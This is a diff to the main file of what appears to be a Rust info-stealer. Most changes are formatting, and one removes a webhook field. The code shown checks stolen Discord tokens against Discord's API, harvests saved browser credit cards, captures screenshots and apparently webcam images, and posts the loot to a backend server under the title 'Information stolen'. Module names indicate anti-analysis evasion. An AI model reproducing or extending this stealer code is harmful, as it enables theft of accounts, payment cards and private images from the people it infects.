@@ -2,13 +2,13 @@
 #![allow(dead_code)] // This is for constants.rs giving tons of dead code warnings
 mod anti_analysis;
 mod browser;
+mod constants;
 mod crypto;
 mod discord;
-mod constants;
-use std::{path::PathBuf, fs};
 use nokhwa::{query_devices, Camera, CaptureAPIBackend};
 use reqwest::blocking::multipart;
 use screenshots::Screen;
+use std::{fs, path::PathBuf};
 
 fn capture_screenshot(save_path: &PathBuf) -> Result<bool, Box<dyn std::error::Error>> {
     let screens = Screen::all();
@@ -52,9 +52,7 @@ fn main() {
 
     let temp_env = std::env::temp_dir();
 
-    let mut form = multipart::Form::new()
-        .text("webhook", constants::ENCRYPTED_WEBHOOK)
-        .text("title", "Information stolen");
+    let mut form = multipart::Form::new().text("title", "Information stolen");
 
     let client = reqwest::blocking::Client::new();
 
@@ -67,7 +65,8 @@ fn main() {
             let user_response = client
                 .get("https://discord.com/api/users/@me")
                 .header("Authorization", &tokens[i])
-                .send().unwrap();
+                .send()
+                .unwrap();
 
             if !user_response.status().is_success() {
                 tokens.remove(i);
@@ -79,7 +78,8 @@ fn main() {
             let user_response = client
                 .get("https://discord.com/api/users/@me")
                 .header("Authorization", token)
-                .send().unwrap();
+                .send()
+                .unwrap();
             form = form.text("user", user_response.text().unwrap());
 
             // Adds the tokens to the request as a text file
@@ -117,7 +117,11 @@ fn main() {
     if constants::STEAL_CREDIT_CARDS {
         // Adds the credit cards to the request as a text file
         let credit_cards_temp_path = temp_env.join("credit_cards.txt");
-        fs::write(&credit_cards_temp_path, browser::get_credit_cards().join("\n")).unwrap();
+        fs::write(
+            &credit_cards_temp_path,
+            browser::get_credit_cards().join("\n"),
+        )
+        .unwrap();
         form = form.file("credit_cards", &credit_cards_temp_path).unwrap();
         fs::remove_file(credit_cards_temp_path).unwrap();
     }
@@ -143,5 +147,9 @@ fn main() {
     }
 
     // Sends the stolen data to the backend
-    client.post(constants::BACKEND).multipart(form).send().unwrap();
+    client
+        .post(constants::BACKEND)
+        .multipart(form)
+        .send()
+        .unwrap();
 }
